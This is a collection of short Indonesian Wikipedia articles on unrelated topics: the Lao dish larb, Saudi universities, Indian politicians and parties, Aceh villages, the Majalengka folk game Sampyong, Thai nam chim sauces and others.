Larb (; , , juga dieja laap, larp atau lahb) adalah hidangan salad daging cincang khas Laos. Hidangan ini dianggap masakan nasional Laos. Hidangan ini juga ditemukan di provinsi Isan, Thailand, yang dihuni suku Laos. Variasi hidangan larb juga ditemukan di kalangan suku Thai di negara bagian Shan, Myanmar, dan provinsi Yunnan, Tiongkok.

Istilah "larb" yang kini dikaitkan dengan makna "keberuntungan" dalam Bahasa Lao dan Thai, sebenarnya memiliki asal kata dari bahasa Lanna Thailand Utara yang bermakna "mencincang daging".

"Larb" sering kali dibuat dari bahan daging ayam, sapi, bebek, ikan, atau babi yang dicincang atau jamur, kemudian dibumbui dengan kecap ikan, air jeruk nipis atau perasaan limau, "padaek" (kecap ikan Laos), nasi bakar yang digiling, dan bumbu lain. Daging cincang ini dapat disajikan mentah-mentah atau matang; cincangan daging ini dicampur cabai merah, daun mint, dan sayuran lain. Nasi bakar giling ("khao khua") juga adalah bagian penting dari hidangan ini. Hidangan ini biasanya disajikan dalam suhu kamar, dan disajikan dengan ketan dan sayur-sayuran mentah.

"Larb" dari Thailand Utara - "larb Lanna" - berbeda dari larb ala Laos dan Isan yang lebih tenar. "Larb" Thailand Utara dari suku Tai Yuan/Khon Mueang tidak memakai kecap ikan, dan jeruk nipis sehingga rasanya tidak asam. Akan tetapi yang digunakan adalah campuran bumbu kering, termasuk jintan putih, cengkih, lada, bunga lawang, andaliman, dan kayu manis, di samping bubuk cabai kering. Untuk "larb" daging babi dan daging ayam, biasanya juga ditambahkan darah binatang tersebut.



</doc>
<doc id="1754370" url="https://id.wikipedia.org/wiki?curid=1754370" title="Universitas Pangeran Sattam bin Abdul Aziz">
Universitas Pangeran Sattam bin Abdul Aziz

Universitas Pangeran Sattam bin Abdul Aziz () (sebelumnya bernama Universitas Al-Kharj dan Universitas Pangeran Salman), adalah sebuah perguruan tinggi negeri di Arab Saudi dibawah Kementerian Pendidikan Arab Saudi dan didirikan pada tahun 2009. Universitas ini terletak di kota Al-Kharj, Provinsi Riyadh. Saat ini universitas ini dipimpin oleh rektornya Dr. Abdurrahman bin Muhammad al-Ashimi.

Universitas ini berdiri sesuai dengan Surat Keputusan Kerajaan tahun 1430 H/2009 dengan penggantian Universitas Raja Saud cabang Al-Kharaj menjadi Universitas yang mandiri dengan nama Universitas Al-Kharj, serta penggabungan seluruh Fakultas yang ada di Al-Kharj, Dellam, Wadi ad-Dawasir, Huthah Bani Tamim, Aflaj, Al-Hariq, As-Sulail ke Universitas ini. Pada tanggal 23 Syawwal 1432 H Rektor mengumumkan penggantian nama universitas menjadi Universitas Salman bin Abdul Aziz sesuai dengan Surat Keputusan Kerajaan. Dan pada tanggal 10 Jumadal Ula 1436 H yang bertepatan dengan 1 Maret 2015, Raja Salman mengeluarkan perintah penggantian nama universitas menjadi Universitas Pangeran Sattam bin Abdul Aziz.












</doc>
<doc id="1754455" url="https://id.wikipedia.org/wiki?curid=1754455" title="Loa Sek Hie">
Loa Sek Hie

Loa Sek Hie Sia (1898-1965) adalah seorang tokoh politik, anggota Volksraad dan tuan tanah di saat akhir era Hindia Belanda. Ia adalah salah-satu pendiri dan kepala barisan keamanan Pao An Tui menjelang Revolusi Nasional Indonesia(1945-1949).

Loa adalah anak baba bangsawan Loa Tiang Hoei, Kapitein der Chinezen di Pasar Baru dari salah-satu gundiknya yang berdarah Austria dan Jawa, yaitu Louise Goldman. Ibu tiri Loa adalah kerabat dari Tio Tek Ho, Majoor der Chinezen di Batavia. Loa juga adalah cucu hartawan besar Loa Po Seng, yang namanya diabadikan di Jalan Poseng di Pasar Baru. Ia meyandang gelar 'Sia' sebagai keturunan Opsir Tionghoa.

Ia mendapat pendidikan Eropa, dan disekolahkan di Europeesche Lagere School (ESL) dan Hoogere Burgerschool (HBS) di Batavia. Ia juga menempuh pendidikan perniagaan dan hukum.

Pada tahun 1919, Loa menikah dengan Corry Tan, putri seorang tuan tanah bernama Tan Liok Tiauw Sia, Landheer van Batoe-Tjepper. Mereka tinggal di Menteng bersama dengan tiga putra putri mereka.

Loa menjadi anggota Volksraad, yang adalah badan legislatif pertama di Hindia Belanda, dari tahun 1927 sampai masuknya Jepang ke tanah air pada saat Perang Dunia Dua. Sebagai anggota legislatif, Loa bersama dengan H. H. Kan mewakili Chung Hwa Hui, partai politik keturunan Tionghoa yang berkooperasi dengan pemerintah kolonial. Namun mereka juga mengupayakan penghapusan diskriminasi berdasarkan ras di Hindia Belanda, dan berusaha mengembangkan sarana pendidikan dan kesehatan bagi komunitas Tionghoa di Indonesia. Dalam rangka ini, Loa menjadi kepala pengurus dan salah-satu pendiri Jang Seng Ie (sekarang Rumah Sakit Husada).

Ia juga adalah anggota Dewan Kota Batavia (Gemeenteraad).

Pada tahun 1929, Loa memberikan referensi karakter untuk Liem Bwan Tjie yang disangka pendukung Komunisme oleh pemerintah kolonial. Dengan bantuan Loa maka Liem diberikan izin oleh pemerintah Hindia Belanda untuk kembali dan menetap serta berkarya di tanah air.

Seperti kakeknya, Loa juga menjadi anggota Freemasonry di Indonesia.

Pada saat Perang Dunia Dua, Loa membantu pengumpulan dana untuk Sekutu baik di Eropa maupun Asia.

Ketika Jepang masuk ke Indonesia, Loa ditahan di Cimahi bersama dengan banyak tokoh-tokoh pemerintah kolonial lainnya, seperti rekan politiknya H. H. Kan dan Khouw Kim An, Majoor der Chinezen. Loa akhirnya dibebaskan saat Jepang kalah perang pada tahun 1945.

Dari tahun 1945 sampai dengan tahun 1949, Indonesia mengalami Revolusi Nasional guna mempertahankan kemerdekaan. Karena proses ini menimbulkan banyak huru-hara, Loa bersama dengan tokoh-tokoh masyarakat Tionghoa lainnya mengambil keputusan untuk mendirikan Pao An Tui yang beritikad netral dan bertindak sebagai barisan keamanan masyarakat Tionghoa. Loa menjadi kepala Pao An Tui, dan berhasil mendapatkan dukungan resmi dari Sutan Sjahrir, Perdana Menteri pertama Indonesia. Pao An Tui dipersenjatakan oleh tentara Sekutu. Karena bantuan senjata dari Sekutu maka banyak kelombok menunding Pao An Tui sebaga kaki-tangan penjajah Belanda.

Loa mendukung didirikannya Republik Indonesia Serikat (RIS) karena beranggapan bahwa RIS dapat lebih memberikan otonomi untuk kelompok-kelompok non-Jawa di tanah air. Menurut Loa, federalisme adalah bentuk pemerintahan yang paling cocok untuk Indonesia yang bersifat beragam suku-bangsa.

Setelah Indonesia merdeka, President pertama RI Sukarno ada banyak minta pendapat Loa dalam hal-hal yang bersangkutan dengan usaha-usaha Belanda dan Tionghoa di Indonesia, dan juga Freemasonry. Namun karena kedekatan Loa dengan pemerintah kolonial, andil politknya sangat berkurang di era kemerdekaan.

Loa meninggal di Den Haag di Belanda pada tangga 24 Desember 1965.



</doc>
<doc id="1754633" url="https://id.wikipedia.org/wiki?curid=1754633" title="Waduk Klebut">
Waduk Klebut

Waduk Klebut merupakan sebuah waduk bersejarah yang terdapat di Desa Jerukwangi Kecamatan Bangsri Kabupaten Jepara.

Daerah pengairan atau irigasi tersebut dinamakan Klebut. Dahulu desa Jerukwangi adalah hutan yang lebat jauh dari pemukiman. Dulunya masih saat zaman Kerajaan Majapahit, daerah tersebut di jajah oleh penjajah Belanda pada zaman mata uang masih cen, mener, godem, slaka tahun 1936.

Karena lamanya penjajah Belanda menjajah daerah Jeruk wangi, penjajah Belanda menemukan sungai dan dibuatkannya irigasi itu. Setelah Belanda pergi dari daerah Jeruk wangi di jajah lagi oleh penjajah Jepang kira-kira tahun 1942 dan Klebut ditemukan dan digunakan oleh orang Jepang.
Setelah Belanda dan Jepang pergi dari desa Jeruk wangi, tanah di daerah tersebut tidak ada pemiliknya atau tidak ada yang mengakui dan daerah itu diakui oleh orang Jambu Sekuro dan sekarang jadi desa Jeruk Wangi. Desa Jeruk wangi mempunyai tiga dukuh yaitu dukuh Krajan, Poring, dan Seminding yang dipisahkan sungai antar sungai.

Pada zaman penjajahan Belanda terdapat pembuatan waduk. Sungai dari sumber mata air pegunungan daerah Sinatah Muria yang mengalir sampai desa Bondo. Pembuatan waduk tersebut bertujuan untuk pengairan atau irigasi untuk mengairi persawahan desa Jeruk wangi sampai desa Bondo. Kini daerah Klebut menjadi irigasi yang sangat membantu desa Jeruk wangi dan desa Bondo. Dahulu Klebut sangat bagus karena ada yang merawat. Lama kelamaan, tahun berganti tahun pasti ada kerusakan yang menjadikan Klebut tidak seindah dulu, “Apabila Klebut ada yang mengurus dan dijadikan tempat wisata pasti desa Jeruk wangi terkenal oleh orang banyak,” harap Mbah Marnoto.


</doc>
<doc id="1754635" url="https://id.wikipedia.org/wiki?curid=1754635" title="Gulaab Gang">
Gulaab Gang

Gulaab Gang adalah sebuah film drama kejahatan India 2014 yang berpusat pada perjuangan wanita di negara tersebut, yang disutradarai oleh Soumik Sen dan diproduksi oleh Anubhav Sinha. Film tersebut dibintangi oleh Madhuri Dixit dan Juhi Chawla. Trailer resminya dirilis pada 10 Januari 2014.
Para anggota Gulaab Gang adalah para aktivis dan vigilante di Bundelkhand Uttar dan Madhya Pradesh. Mereka mengenakan saree merah jambu


Track pertamanya, yang berjudul "Dheemi Dheemi", dirilis sebagai sebuah singel pada 18 Januari 2014. Pada 25 Januari 2014, soundtrack "Gulaab Gang" dirilis di Varanasi ketika lebih dari 18 ribu orang menyaksikannya. Album tersebut memiliki tujuh track yang dikomposisikan oleh Soumik Sen dan Sadhu Sushil Tiwari. Lagu Gulaabi dirilis pada Januari 2014 dan menjadi chart buster. Lagu lainnya "Mauj Ki Malaharein" dirilis pada 28 Februari 2014 dan menjadi sangat populer. Soundtrack tersebut dinyanyikan oleh Sadhu Sushil Tiwari, Superwoman & Chaittali Shrivasttava.



</doc>
<doc id="1754637" url="https://id.wikipedia.org/wiki?curid=1754637" title="Noeroel Koesmen">
Noeroel Koesmen

Kol. (Purn.) Noeroel Koesmen (EYD: "Nurul Kusmen"; ) adalah Bupati Jombang yang menjabat pada periode 1983 hingga 1988. Ia juga anggota DPRD Jawa Timur periode 1992-1997.

Noeroel Koesmen lahir pada 30 April 1937, di Jember. Bapaknya bernama M. Kusdi Wiryo Kusumo, dan ibunya bernama Rr. Rukanti.


Sebagai seorang prajurit, ia pernah mengemban berbagai macam tugas seperti pendidikan Pusat Artileri Medan, di Cimahi, Jawa Barat, pada tahun 1961-1965. Batalion Armed II, di Medan, Sumatra Utara, sebagai Komandan Kompi, tahun 1966-1967. Depo Pendidikan Armed, sebagai wakil Komandan Batalion, di Pematang Siantar, pada tahun 1968-1972. Kepala Seksi Operasi di Resimen Armed 4, di Medan, Sumatra Utara, tahun 1972. Komandan Batalian Depo Pendidikan Armed, di Pematang Siantar, tahun 1973-1977. Komandan Batalion Armed 8, di Jember, tahun 1977. Komandan Kodim di Sumenep, tahun 1977-1980. Komandan Kodim di Kediri, tahun 1980-1982. dan Kepala Staf Korem di Kediri, tahun 1980-1982.

Ketika menjabat sebagai Komandan Kodim di Sumenep, ia memang sudah dikenal baik dan dekat dengan warga serta ulama setempat. Dari kemiliteran, lalu dia ditawarkan ke Partai Golkar. Berkas-berkas dilengkapi, kemudian disekolahkan ke Jakarta selama 9 bulan untuk belajar khusus tentang kepemimpinan, teknik sipil, manajemen pemerintahan dan teknologi pemerintahan. Setelah itu barulah dia bisa terjun ke lapangan sebagai Bupati Jombang. Prinsip kepemimpinan yang diterapkannya di Jombang menggunakan corak “ludrukan”, yakni: "“Yo Opo Apike, Yo Opo Enake, Yo Opo Benere”". Artinya: “Bagaimana baiknya, Bagaimana Enaknya, Bagaimana Benarnya (seharusnya)”.

Pada masa dia memimpin sebagai bupati, Jombang memperoleh keberhasilan sebagai penghasil besar tertinggi se Indonesia selama tiga tahun berturut-turut, yakni tahun 1986, tahun 1987, dan tahun 1988. Mendapatkan juara Nasional selama tiga tahun berturut-turut dalam penghasilan tebu dengan dijalankannya TRIS (Tebu Rakyat Intensifikasi), dan juara harapan tingkat nasinal di bidang kopi rakyat.

Salah satu cita-citanya yang belum terlaksana adalah mendirikan semacam “Laboratorium Hama” yang rencananya ditempatkan di Kecamatan Mojoagung. Ini untuk mengatasi hama kutu loncat yang kerap menyerang padi dan membuat para petani gagal panen. “Laboratorium Tanah” juga belum tercapai, di mana usaha ini ditujukan untuk penelitian kondisi tanah yang selalu mengalami perubahan di saat pengolahannya dan situasi cuaca yang bisa berubah sewaktu-waktu. Kebutuhan akan air di lahan pertanian di Jombang tidak sepenuhnya bergantung pada Sungai Brantas dan Sungai Konto. Penggunaan air dari Kali Brantas misalnya yang mengalir ke Jombang juga tergantung pada kondisi kebutuhan para petani di daerah Nganjuk dan Kediri. Karenanya, penggalian “sumur bor” di sekitar daerah pertanian dipilih para petani untuk mengaliri sawah-sawah mereka, tanpa mempertimbangkan dampaknya.

Baginya, Jombang merupakan daerah penyanggah utama yang memiliki posisi sentral di wilayah Jawa Timur. Wilayah tengah sebagi penyanggah ("buffer") ini sejak jaman dahulu pada masa Kerajaan Majapahit yang menempatkan posisi Jombang sebagai gerbang kerajaan sebelah barat. Jarak tempuh ini disamakan dengan jarak tempuh “kuda”. Rata-rata kecepatan kuda yang dikendarai prajurit misalnya sebagai penyampai berita berkisaran antara kurang lebih 30 km. Jombang-Kediri memiliki jarak tempuh sekitar 30 km. Kediri-Blitar, kurang lebih 30 km. Jombang-Nganjuk memiliki jarak tempuh sekisar 35 km. Demikian juga di wilayah sekirasan itu. Ini memperkirakan kekuatan lari kuda yang per 30 km harus istirahat.

Gambaran demikian digunakan asumsi oleh Noeroel Koesmen untuk menempatkan dan menyebut Jombang sebagai daerah penyanggah kota atau daerah lainnya. Oleh karena itu sumber daya padi dan lebih spesifik penggalakan dunia pertanian menjadi acuan penting untuk memproyeksikan Jombang sebagai pusat lumbung padi dan lalu-lintas niaga lainnya. Sangat disayangkan jika saat itu daerah Jombang tidak termasuk daerah Gerbangkertosusila di mana beberapa wilayah lainnya seperti Mojokerto, Lamongan, atau Surabaya masuk dalam kategori ini. Padahal posisi strategisnya memungkinkan Jombang untuk itu. Maka dari itu, pengembangan Jombang sebagai basis penghasil padi harus menjadi perhatian yang tidak bisa disepelekan. Jombang memiliki hamparan tanah pertanian yang luas dan humusnya (kadar kesuburan) sangat tinggi dan bagus. Jalur transportasi musti dioptimalkan. Peningkatan pengetahuan akan dunia pertanian harus digalakkan. Mempertajam ancangan pembangunan untuk menempatkan Jombang sebagai pusat agribisnis dan oleh sebab itu perlu meningkatkan teknologi pertanian yang baik. Saat itu yang diupayakan Noeroel Koesmen adalah menjadikan Kecamatan Peterongan dan Mojoagung sebagai daerah industri agar dapat melayani daerah-daerah lain maupun luar kota.

Setelah tidak lagi menjadi bupati, Noeroel pernah menjadi anggota DPRD Jawa Timur periode 1992-1997. Ia lalu menetap di Surabaya



</doc>
<doc id="1754638" url="https://id.wikipedia.org/wiki?curid=1754638" title="Garurumon">
Garurumon

Garurumon merupakan salah satu digimon yang menjadi peran utama dalam Digimon Adventure dan Digimon Adventure 02. Garurumon berasal dari kata "garuru" yang dalam bahasa Jepang berarti auman serigala sesuai dengan bentuknya yang berupa serigala dengan belang biru-putih. Dalam tingkatan level evolusi, Garurumon berlevel Champion. Ia berevolusi dari Gabumon, dan evolusi berikutnya (level Ultimate) adalah WereGarurumon. Partnernya dalam seri anime Digimon Adventure dan Digimon Adventure 02 adalah Yamato Ishida.

Gabumon berevolusi menjadi Garurumon pada episode 3 dalam pertarungan melawan Seadramon. Gabumon berusaha melindungi Yamato dari serangan Seadramon, yang menjadikannya berevolusi menjadi Garurumon.

Kekuatan utamanya adalah semburan api biru dari mulutnya, yang disebut dengan "Howling Blaster" (disebut juga dengan "Blue Blaster" pada beberapa terjemahan).



</doc>
<doc id="1754641" url="https://id.wikipedia.org/wiki?curid=1754641" title="Front Rakyat Naga">
Front Rakyat Naga

Front Rakyat Naga adalah sebuah partai politik regional di Nagaland dan Manipur, India. Partai tersebut dikepalai pemerintah Nagaland dengan Partai Bharatiya Janata, sebagai bagian dari Aliansi Demokratik Nagaland sejak 2003. Dr. Shürhozelie adalah presiden dari partai tersebut. Pemimpin utama FRN, Neiphiu Rio, adalah anggota Lok Sabha dari konstitusi sendiri Nagaland.



</doc>
<doc id="1754644" url="https://id.wikipedia.org/wiki?curid=1754644" title="Lal Thanhawla">
Lal Thanhawla

Lal Thanhawla (kelahiran 19 Mei 1942) adalah seorang politikus India dan masuk ke partai Kongres Nasional India. Ia menjadi Ketua Menteri Mizoram sejak 11 Desember 2008. Ia terpilih kembali dalam pemilihan Mahkamah Legislatif Mizoram 2013 dan melanjutkan jabatan tersebut sejak 14 Desember 2013. Jabatan tersebut menjadi masa jabatan kelimanya pada jabatan Ketua Menteri, yang merupakan sebuah rekor di Mizoram. Konstituensi elektoralnya adalah Serchhip dan Hrangturzo. Ia berkhasil berkontestan dalam pemilihan umum sebanyak sembilan kali, pada 1978, 1979, 1984, 1987, 1993, 2003, 2008, dan 2013.



</doc>
<doc id="1754648" url="https://id.wikipedia.org/wiki?curid=1754648" title="Akhilesh Yadav">
Akhilesh Yadav

Akhilesh Yadav (; kelahiran 1 Juli 1973) adalah seorang politikus India yang menjadi Ketua Menteri Uttar Pradesh sejak 2012. Sebagai seorang anggota dari Partai Samajwadi, ia dilantik menjadi Ketua Menteri pada Maret 2012, yang pada waktu itu ia menjadi orang termuda yang memegang jabatan tersebut.
Akhilesh Yadav lahir dari pasangan Mulayam Singh Yadav dan Malti Devi pada 1 Juli 1973 di Desa Saifai, Distrik Etawah, Uttar Pradesh. Ia belajar di Sekolah Militer Dholpur di Dholpur, Rajasthan dan kemudian dianugerahi sebuah gelar dalam bidang teknik lingkungan hidup ketika belajar di Mysore. Ia pergi ke Australia untuk mendapatkan sebuah gelar master dalam bidang yang sama.



</doc>
<doc id="1754656" url="https://id.wikipedia.org/wiki?curid=1754656" title="Telangana Rashtra Samithi">
Telangana Rashtra Samithi

Telangana Rashtra Samithi (TRS) adalah sebuah partai politik regional di negara bagian Selatan Indian Telangana. yang saat ini menjalankan pemerintahan di negara bagian yang baru dibentuk Telangana, yang memisahkan diri dari Andhra Pradesh pada 2 Juni 2014.

Wilayah Telangana telah ada sebelum pembentukan Negara Bagian Andhra Pradesh pada 1956. K. Chandrashekar Rao (KCR), pendiri dan presiden Telangana Rashtra Samithi, menjadi anggota Partai Telugu Desam sampai ia keluar dari partai tersebut karena berbeda dengan Nara Chandrababu Naidu tentang Telangana dan membentuk TRS pada 2001 di Siddipet, India Hyderabad. Ia kaluar dari Keanggotaan Mahkamah Legislatif AP dan jabatan Jurubicara Deputi Legislatur AP ketika mengembangkan partai tersebut. Partai tersebut awalnya memenangkan salah satu per tiga Konstituensi Teritorial Mandal Parishad (KTMP) dan satu seperempat dari Konstituensi Teritorial Zilla Parishad (KTZP) di Siddipet pada enam puluh hari pembentukan partai tersebut.



</doc>
<doc id="1754662" url="https://id.wikipedia.org/wiki?curid=1754662" title="Pulo Ie I, Kluet Utara, Aceh Selatan">
Pulo Ie I, Kluet Utara, Aceh Selatan

Pulo Ie atau Pulo Ie I merupakan salah satu gampong yang ada di kecamatan Kluet Utara, Kabupaten Aceh Selatan, provinsi Aceh, Indonesia. Kode wilayah Kemendagri untuk gampong ini yaitu 11.01.02.2005.


</doc>
<doc id="1754668" url="https://id.wikipedia.org/wiki?curid=1754668" title="Kota Fajar, Kluet Utara, Aceh Selatan">
Kota Fajar, Kluet Utara, Aceh Selatan

Kota Fajar merupakan salah satu gampong yang ada di kecamatan Kluet Utara, Kabupaten Aceh Selatan, provinsi Aceh, Indonesia. Kode wilayah Kemendagri untuk gampong ini yaitu 11.01.02.2020.


</doc>
<doc id="1754669" url="https://id.wikipedia.org/wiki?curid=1754669" title="Gunung Pudung, Kluet Utara, Aceh Selatan">
Gunung Pudung, Kluet Utara, Aceh Selatan

Gunung Pudung merupakan salah satu gampong yang ada di kecamatan Kluet Utara, Kabupaten Aceh Selatan, provinsi Aceh, Indonesia. Kode wilayah Kemendagri untuk gampong ini yaitu 11.01.02.2021.


</doc>
<doc id="1754681" url="https://id.wikipedia.org/wiki?curid=1754681" title="Universitas Perbatasan Utara">
Universitas Perbatasan Utara

Universitas Perbatasan Utara () adalah salah satu perguruan tinggi negeri dibawah Kementerian Pendidikan Arab Saudi yang terletak di kota Arar, Hududusy Syamaliyah, Arab Saudi. Perguruan tinggi ini berdiri pada tahun 2007, saat ini universitas ini memiliki 15 Fakultas, 9 di Arar, 4 di Rafha dan 2 di Turaif. Universitas ini memiliki berbagai jurusan, dalam tingkat sarjana dan magister.

Kampus utama Universitas Perbatasan Utara terletak di Jalan Raya Bandara, kota Arar, kampus lainnya terdapat di Rafha dan Turaif.






</doc>
<doc id="1754682" url="https://id.wikipedia.org/wiki?curid=1754682" title="Kalong seram">
Kalong seram

Kalong seram ("Pteropus ocularis") adalah salah satu spesies codot dari keluarga Pteropodidae. Ia adalah hewan endemik pada hutan pengunungan di dua pulau di Indonesia, yaitu Pulau Buru dan Pulau Seram, termasuk Taman Nasional Manusela di Seram. Mereka pernah pula hidup di Pulau Ambon yang berdekatan letaknya, namun kemungkinan saat ini tidak lagi. Habitat mereka adalah area seluas kurang dari 20.000 km, dan terus berkurang karena penebangan pohon. Karena alasan tersebut dan karena perburuan oleh penduduk setempat, spesies ini tergolong dalam kategori rentan dalam IUCN sejak 1996.


</doc>
<doc id="1754683" url="https://id.wikipedia.org/wiki?curid=1754683" title="Daftar ketua menteri India perempuan">
Daftar ketua menteri India perempuan

Enam belas wanita telah menjabat sebagai ketua menteri dari sebuah negara bagian India. Saat ini, tiga diantaranya sedang menjabat—Vasundhara Raje, Mamata Banerjee, dan Mehbooba Mufti. Dari dua belas negara bagian yang dikepalai oleh seorang ketua menteri perempuan, hanya tiga—Delhi, Tamil Nadu dan Uttar Pradesh—yang telah memiliki dua premier wanita.


 ketua menteri petahana



</doc>
<doc id="1754686" url="https://id.wikipedia.org/wiki?curid=1754686" title="Ketua Menteri (India)">
Ketua Menteri (India)

Di Republik India, seorang Ketua Menteri adalah kepala pemerintah dari setiap dua puluh sembilan negara bagian dan dua teritorial serikat (Delhi dan Puducherry). Menurut konstitusi India, di tingkat negara bagian, gubernur adalah kepala "de jure", tetapi otoritas eksekutif "de facto" dikepalai oleh ketua menteri. Setelah pemilihan-pemilihan dari mahkamah legislatif negara bagian, gubernur biasanya mengundang partai (atau koalisi) dengan mayoritas kursi dari bentuk pemerintahan tersebut. Gubernur yang melantik ketua menteri, di mana dewan menteri menjadi penanggung jawab kolektif dari mahkamah tersebut. Memberikannya kepercayaan dari mahkamah tersebut, masa jabatan ketua menteri biasanya paling lama lima tahun; tidak ada batas-batas untuk jumlah masa jabatan yang ia dapat jabati.

Seorang Ketua Menteri harus:




</doc>
<doc id="1754687" url="https://id.wikipedia.org/wiki?curid=1754687" title="SMP Negeri 3 Cikarang Utara">
SMP Negeri 3 Cikarang Utara

SMP Negri 3 Cikarang Utara merupakan salah satu Sekolah Menengah Pertama yang ada di Provinsi Jawa Barat, Indonesia. Sama dengan SMP pada umumnya di Indonesia. Masa pendidikan sekolah di SMP Negri 3 Cikarang Utara ditempuh dalam waktu tiga tahun pelajaran, mulai dari Kelas VII sampai Kelas IX.

Berbagai fasilitas yang dimiliki SMP Negri 3 Cikarang Utara untuk menunjang kegiatan belajar-mengajar, diantaranya:

Website


</doc>
<doc id="1754688" url="https://id.wikipedia.org/wiki?curid=1754688" title="Badan Penanggulangan Bencana Daerah Kabupaten Bantul">
Badan Penanggulangan Bencana Daerah Kabupaten Bantul

Badan Penanggulangan Bencana Daerah (BPBD) Kabupaten Bantul adalah lembaga pemerintah non-departemen yang melaksanakan tugas penanggulangan bencana di wilayah Kabupaten Bantul, dengan berpedoman pada kebijakan yang ditetapkan oleh Badan Nasional Penanggulangan Bencana (BNPB). BPBD Kabupaten Bantul dibentuk berdasarkan Peraturan Daerah Nomor 06 Tahun 2010, menggantikan Satuan Pelaksana Penanganan Bencana (Satlak PB) di tingkat Kabupaten Bantul.

BPBD Kabupaten Bantul merupakan unsur pendukung Pemerintah Kabupaten Bantul yang dipimpin oleh seorang Kepala Badan yang berkedudukan di bawah dan bertanggung jawab kepada Bupati Bantul. Kepala Badan secara "ex-officio" dijabat oleh Sekretaris Daerah.




</doc>
<doc id="1754689" url="https://id.wikipedia.org/wiki?curid=1754689" title="Ketua Menteri Delhi">
Ketua Menteri Delhi

Ketua Menteri Delhi adalah kepala pemerintahan Wilayah Ibukota Nasional Delhi di utara India. Ketua Menteri adalah kepala Majelis Menteri dan pemimpin partai mayoritas di mahkamah Delhi. Ketua Menteri memimpin cabang eksekutif Pemerintahan Delhi. Arvind Kejriwal adalah Ketua Menteri petahana. Ia memegang jabatan tersebut pada 14 Februari 2015.

Setelah 1 tahun pemerintahan presiden di Delhi, Mahkamah melakukan pemilihan yang diselenggarakan pada 7 Februari 2015. Partai Aam Aadmi membuat sejarah dengan memenangkan 67 dari 70 kursi di Mahkamah tersebut. Arvind Kejriwal menjadi Ketua Menteri Delhi saat ini dan mulai memegang jabatan pada 14 Februari 2015.




</doc>
<doc id="1754695" url="https://id.wikipedia.org/wiki?curid=1754695" title="Daftar Gubernur Prefektur di Jepang">
Daftar Gubernur Prefektur di Jepang

Berikut ini adalah daftar gubernur prefektur Jepang saat ini.



</doc>
<doc id="1754703" url="https://id.wikipedia.org/wiki?curid=1754703" title="Sampyong Majalengka">
Sampyong Majalengka

Sempyong Majalengka adalah kesenian adu ketangkasan dan kekuatan memukul dan dipukul dengan mengunakan alat yang terbuat dari kayu atau rotan berukuran 60 cm.

Kesenian Sempyong ini berasal dari Kabupaten Majalengka Jawa Barat yang terletak di antara perbatasan kabupaten Indramayu di utara, kabupaten Cirebon dan kabupaten Kuningan di timur, kabupaten Ciamis dan kabupaten Tasikmalaya di selatan, serta kabupaten Sumedang di barat, ternyata mempunyai kesenian tradisional yang harus di lestarikan salah satunya adalah kesenian sampyong Majalengka.

Konon, pada tahun 1960 di daerah Cibodas Kecamatan Majalengka tumbuh sebuah permainan rakyat yang dikenal dengan ujungan. Permainan ini merupakan permainan adu ketangkasan dan kekuatan memukul dan dipukul dengan mengunakan alat yang terbuat dari kayu atau rotan berukuran 60 cm. Pemain terdiri atas dua orang yang saling berhadapan, baik laki-laki maupun perempuan, dipimpin oleh seorang wasit yang disebut malandang. Kedua pemain menggunakan teregos, yaitu tutup kepala yang terbuat dari kain yang diisi dengan bahan-bahan empuk sebagai pelindung kepala. Tutup kepala demikian dikenal pula dengan sebutan balakutal. Sasaran pukulan pada permainan ujungan tidak terbatas, dari ujung kepala hingga ujung kaki tanpa di tangkis. Seorang pemain dapat memukul lawanya sebanyak-banyaknya, atau bahkan dipukul sebanyak-banyaknya, hingga salah seorang diantaranya dinyatakan kalah karena tidak lagi kuat manehan rasa sakit akibat pukulan.


Seiring dengan berlakunya peraturan yang baru itu, maka nama ujungan pun ditinggalkan. Nama permainan yang lebih populer adalah
"Sampyong", yang mempunyai arti; "Sam = Tiga dan Pyong = Pukulan". Nama baru ini terucap begitu saja dari salah seorang penonton keturunan Cina ketika ia menyaksikan permainan ini. Kiranya ia tertarik pada jumlah pukulan pada permaianan ini hingga kemudian terucaplah kata Sampyong yang kemudian melekat menjadi sebutan permainan sampai sekarang.

Sebagai salah satu seni pertunjukan tradisional, sampyong di pertunjukan pada acara-acara tertentu, misalnya pada acara hajatan, dan kini lebih sering terlihat pada acara kontes ketangkasan domba (adu domba). Berikut beberapa urutan pertunjukan sampyong pada suatu acara khusus:


Tokoh - tokoh yang berjasa dalam mengembangkan dan melestarikan kesenian sampyong ini adalah antara lain: "Sanen (Almarhum)," "Abah Lewo," "Mang Kiyun," "mang Karta," "K. Almawi," "Baron," "Komar," "Anah," "Emindan" beberapa tokoh lainnya yang tersebar di beberapa daerah Majalengka. Berkat keulatan para tokoh tersebut, sampyong tersebar kebeberapa daerah diantaranya Cibodas, Kulur, Sidangkasih, Cijati, Simpeureum, Pasirmuncang, dan beberapa daerah lainnya. Sebagai penghormatan, kelompok seni sampyong Mekar Padesaan dari simpeureum pernah mewakili Jawa Barat pada event pertunjukan seni olahraga di Bali beberapa waktu yang lalu.




</doc>
<doc id="1754720" url="https://id.wikipedia.org/wiki?curid=1754720" title="Nam chim">
Nam chim

Nam chim atau Nam jim (, ) adalah istilah dalam Bahasa Thai untuk merujuk kepada "saus celup". Istilah ini dapat mengacu kepada berbagai jenis saus celup atau saus cocol dalam Masakan Thailand, yang kebanyakan merupakan kombinasi dari rasa asam, manis, asin, dan pedas. Dari segi kekentalan, "nam chim" cenderung lebih encer daripada "nam phrik" (sambal ala Thai). Meskipun saus Sriracha lebih dikenal sebagai "sot Sriracha" di Thailand ("sot" adalah cara penyebutan Thai untuk "saus"), kadang-kadang juga disebut "nam chim Siracha" atau "nam phrik Siracha".

Jenis "nam chim" yang paling dasar, adalah sejenis saus cocol yang lazim digunakan untuk menyantap hidangan laut bakar atau kukus. Saus "nam chim" ini mengandung bawang putih tumbuk, "nam pla" (kecap ikan), gula, sari jeruk nipis atau air limau, dan cabai rawit. Variasi dari resep dasar ini juga dapat digunakan sebagai saus cocol dari berbagai jenis masakan Thai. Kebanyakan bahan-bahan "nam chim" diiris halus atau ditumbuk dan dilumatkan dengan menggunakan cobek dan ulekan, atau menggunakan blender.

Saus celup yang populer di Thailand antara lain:



</doc>
<doc id="1754727" url="https://id.wikipedia.org/wiki?curid=1754727" title="Biju Janata Dal">
Biju Janata Dal

Biju Janata Dal (BJD) () adalah sebuah partai politik negara bagian India Odisha yang dipimpin oleh Naveen Patnaik, putra dari mantan ketua menteri negara bagian Biju Patnaik. Partai tersebut didirikan pada 26 Desember 1997.



</doc>
<doc id="1754732" url="https://id.wikipedia.org/wiki?curid=1754732" title="Skandal valas">
Skandal valas

